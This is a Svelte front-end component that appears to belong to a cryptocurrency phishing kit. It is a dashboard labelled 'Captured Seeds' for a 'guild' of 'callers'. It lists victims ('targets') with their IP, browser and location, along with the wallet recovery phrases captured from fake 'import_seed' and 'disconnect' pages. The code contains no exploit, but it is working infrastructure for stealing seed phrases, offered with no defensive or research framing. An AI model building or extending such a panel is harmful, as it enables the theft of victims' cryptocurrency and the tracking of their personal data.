<script lang="ts">
	import { onMount } from 'svelte';
	import { fade, slide } from 'svelte/transition';
	export let guild: string;

	interface Target {
		id: string;
		ip: string;
		status: string;
		currentpage: string;
		browser: string;
		location: string;
		belongsto: string;
	}

	interface Seed {
		targetid: string;
		page: string;
		captureddata: string;
	}

	let targets: Target[] = [];
	let seeds: Seed[] = [];
	let loading = true;
	let error: string | null = null;
	let searchTerm = '';
	let currentPage = 1;
	const itemsPerPage = 5;

	$: filteredSeeds = seeds.filter(
		(seed) =>
			seed.captureddata.toLowerCase().includes(searchTerm.toLowerCase()) ||
			seed.targetid.toLowerCase().includes(searchTerm.toLowerCase())
	);

	$: totalPages = Math.ceil(filteredSeeds.length / itemsPerPage);
	$: paginatedSeeds = filteredSeeds.slice(
		(currentPage - 1) * itemsPerPage,
		currentPage * itemsPerPage
	);
	$: pageNumbers = Array.from({ length: totalPages }, (_, i) => i + 1);

	function nextPage() {
		if (currentPage < totalPages) currentPage++;
	}

	function previousPage() {
		if (currentPage > 1) currentPage--;
	}

	function goToPage(page: number) {
		if (page >= 1 && page <= totalPages) {
			currentPage = page;
		}
	}

	async function fetchSeeds() {
		try {
			const targetsResponse = await fetch(`/api/guild/getCallerTargets?guild=${guild}`);
			const targetsData = await targetsResponse.json();

			if (targetsData.success) {
				targets = targetsData.targets;

				const seedsResponse = await fetch('/api/guild/getCapturedSeeds', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						guild,
						targetIds: targets.map((t) => t.id)
					})
				});

				const seedsData = await seedsResponse.json();
				if (seedsData.success) {
					seeds = seedsData.seeds;
				}
			}
			loading = false;
		} catch (err) {
			error = 'Failed to fetch seeds';
			console.error(err);
			loading = false;
		}
	}

	onMount(() => {
		fetchSeeds();
	});
</script>

<div class="seeds-container">
	<div class="intro">
		<div class="header-content">
			<div class="title-section">
				<h1>Captured Seeds</h1>
				<p>View all captured recovery phrases and seeds</p>
			</div>
			<div class="search-box">
				<span class="material-icons search-icon">search</span>
				<input type="text" bind:value={searchTerm} placeholder="Search seeds or target IDs..." />
			</div>
		</div>
	</div>

	{#if error}
		<div class="error-message" transition:slide>
			<span class="material-icons">error_outline</span>
			<p>{error}</p>
			<button class="close-error" on:click={() => (error = null)}>
				<span class="material-icons">close</span>
			</button>
		</div>
	{/if}

	{#if loading}
		<div class="loading">
			<div class="loader"></div>
			<span>Loading seeds...</span>
		</div>
	{:else}
		<div class="seeds-grid" transition:fade>
			{#each paginatedSeeds as seed}
				<div class="seed-card" transition:slide>
					<div class="seed-header">
						<div class="target-info">
							<span class="material-icons">person</span>
							<span class="target-id">Target: {seed.targetid}</span>
						</div>
						<div class="caller-info">
							{#if targets.find((t) => t.id === seed.targetid)}
								<span class="caller">{targets.find((t) => t.id === seed.targetid)?.belongsto}</span>
							{/if}
						</div>
					</div>
					<div class="seed-content">
						<div class="page-info">
							<span class="material-icons">
								{#if seed.page === 'import_seed'}
									vpn_key
								{:else if seed.page.includes('disconnect')}
									link_off
								{:else}
									description
								{/if}
							</span>
							<span class="page-name">{seed.page}</span>
						</div>
						<div class="seed-data">
							<p class="label">Captured Data:</p>
							<div class="data-box">
								{seed.captureddata}
							</div>
						</div>
						<div class="target-details">
							{#if targets.find((t) => t.id === seed.targetid)}
								{@const target = targets.find((t) => t.id === seed.targetid)}
								<div class="detail">
									<span class="material-icons">public</span>
									<span>{target?.location || 'Unknown'}</span>
								</div>
								<div class="detail">
									<span class="material-icons">computer</span>
									<span>{target?.browser || 'Unknown'}</span>
								</div>
								<div class="detail">
									<span class="material-icons">wifi</span>
									<span>{target?.ip}</span>
								</div>
							{/if}
						</div>
					</div>
				</div>
			{/each}
		</div>

		<div class="pagination">
			<button class="page-btn" on:click={previousPage} disabled={currentPage === 1}>
				<span class="material-icons">chevron_left</span>
			</button>

			{#each pageNumbers as page}
				<button
					class="page-btn {currentPage === page ? 'active' : ''}"
					on:click={() => goToPage(page)}
				>
					{page}
				</button>
			{/each}

			<button class="page-btn" on:click={nextPage} disabled={currentPage === totalPages}>
				<span class="material-icons">chevron_right</span>
			</button>
		</div>
	{/if}
</div>

<style>
	.seeds-container {
		padding: 2em;
	}

	.header-content {
		display: flex;
		justify-content: space-between;
		align-items: center;
		margin-bottom: 2em;
	}

	.title-section h1 {
		color: white;
		margin: 0;
		font-size: 2em;
	}

	.title-section p {
		color: #8b8b8b;
		margin: 0.5em 0 0 0;
	}

	.search-box {
		position: relative;
		width: 300px;
	}

	.search-box .search-icon {
		position: absolute;
		left: 1em;
		top: 50%;
		transform: translateY(-50%);
		color: #8b8b8b;
	}

	.search-box input {
		width: 100%;
		padding: 0.8em 1em 0.8em 3em;
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border: 1px solid #0f131d;
		border-radius: 0.5em;
		color: white;
		transition: all 0.3s ease;
	}

	.search-box input:focus {
		outline: none;
		border-color: rgba(56, 35, 155, 0.6);
	}

	.seeds-grid {
		display: grid;
		grid-template-columns: 1fr;
		gap: 1.5em;
		margin-bottom: 2em;
	}

	.seed-card {
		background: rgb(56, 35, 155);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.2) 0%, #0e0d15 60%);
		border: 1px solid #0f131d;
		border-radius: 1em;
		overflow: hidden;
		transition: all 0.3s ease;
	}

	.seed-card:hover {
		transform: translateY(-5px);
		box-shadow: 0 5px 15px rgba(56, 35, 155, 0.2);
		border: 1px solid rgba(56, 35, 155, 0.6);
	}

	.seed-header {
		padding: 1em;
		background: rgba(56, 35, 155, 0.2);
		display: flex;
		justify-content: space-between;
		align-items: center;
	}

	.target-info {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: white;
	}

	.caller-info {
		color: #7f7ff7;
		font-size: 0.9em;
	}

	.seed-content {
		padding: 1.5em;
	}

	.page-info {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #7f7ff7;
		margin-bottom: 1em;
	}

	.seed-data {
		background: rgba(56, 35, 155, 0.1);
		border-radius: 0.5em;
		padding: 1em;
		margin-bottom: 1em;
	}

	.label {
		color: #8b8b8b;
		margin-bottom: 0.5em;
	}

	.data-box {
		color: #7ff78f;
		font-family: monospace;
		word-break: break-all;
	}

	.target-details {
		display: grid;
		grid-template-columns: repeat(3, 1fr);
		gap: 1em;
		padding-top: 1em;
		border-top: 1px solid rgba(56, 35, 155, 0.2);
	}

	.detail {
		display: flex;
		align-items: center;
		gap: 0.5em;
		color: #8b8b8b;
		font-size: 0.9em;
	}

	.pagination {
		display: flex;
		justify-content: center;
		align-items: center;
		gap: 0.5em;
		margin-top: 2em;
	}

	.page-btn {
		padding: 0.5em 1em;
		background: rgba(56, 35, 155, 0.2);
		border: 1px solid #0f131d;
		border-radius: 0.5em;
		color: #7f7ff7;
		cursor: pointer;
		transition: all 0.3s ease;
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.page-btn:hover:not(:disabled) {
		background: rgba(56, 35, 155, 0.3);
		transform: translateY(-2px);
	}

	.page-btn.active {
		background: #38239b;
		color: white;
	}

	.page-btn:disabled {
		opacity: 0.5;
		cursor: not-allowed;
	}

	.loading {
		text-align: center;
		padding: 4em;
		color: #8b8b8b;
	}

	.loader {
		width: 40px;
		height: 40px;
		border: 3px solid rgba(56, 35, 155, 0.2);
		border-top-color: #7f7ff7;
		border-radius: 50%;
		animation: spin 1s linear infinite;
		margin: 0 auto 1em;
	}

	@keyframes spin {
		to {
			transform: rotate(360deg);
		}
	}

	.error-message {
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 1em;
		background: rgba(155, 35, 35, 0.2);
		color: #f77f7f;
		border-radius: 0.5em;
		margin-bottom: 1em;
	}

	.close-error {
		margin-left: auto;
		background: none;
		border: none;
		color: #f77f7f;
		cursor: pointer;
	}
</style>
